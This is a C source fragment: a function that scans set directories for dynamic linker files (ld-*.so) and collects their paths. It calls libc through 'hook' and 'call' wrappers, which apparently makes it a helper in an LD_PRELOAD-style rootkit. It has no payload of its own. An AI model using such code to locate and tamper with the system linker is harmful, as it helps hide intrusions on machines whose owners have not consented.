// searches all ldhomes directories for ld.so & returns an array of char pointers to each valid ld.so
char **ldfind(void){
    char *home, *ldname, *namedup, *nametok;
    int found=0, isanld=0;
    struct dirent *dir;
    DIR *dp;
    struct stat sbuf;

    char **foundlds = malloc(MAXLDS*(PATH_MAX+1));
    if(!foundlds) return NULL;
    for(int i=0; i<MAXLDS; i++)
        foundlds[i] = malloc(PATH_MAX+1);

    hook(COPENDIR, CREADDIR, C__LXSTAT);

    for(int i=0; i<sizeofarr(ldhomes); i++){
        home = ldhomes[i];
        
        dp = call(COPENDIR, home);
        if(dp == NULL) continue;

        while((dir = call(CREADDIR, dp)) != NULL){
            if(!strncmp(".", dir->d_name, 1) || strncmp("ld-", dir->d_name, 3))
                continue;

            ldname = dir->d_name;
            namedup = strdup(ldname);
            nametok = strtok(namedup, ".");
            while(nametok != NULL){
                if(!strcmp("so\0", nametok)){
                    isanld = 1;
                    break;
                }
                nametok = strtok(NULL, ".");
            }
            free(namedup);

            if(isanld != 1)
                continue;
            else isanld = 0;

            char path[strlen(home)+strlen(ldname)+2];
            snprintf(path, sizeof(path), "%s/%s", home, ldname);

            memset(&sbuf, 0, sizeof(struct stat));
            if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || S_ISLNK(sbuf.st_mode))
                continue;

            strncpy(foundlds[found++], path, PATH_MAX);
            if(found == MAXLDS)
                break;
        }

        closedir(dp);
        if(found == MAXLDS)
            break;
    }

    // free unused
    for(int i=0; i<MAXLDS; i++){
        if(strlen(foundlds[i]) == 0){
            free(foundlds[i]);
            foundlds[i] = NULL;
        }
    }

    return foundlds;
}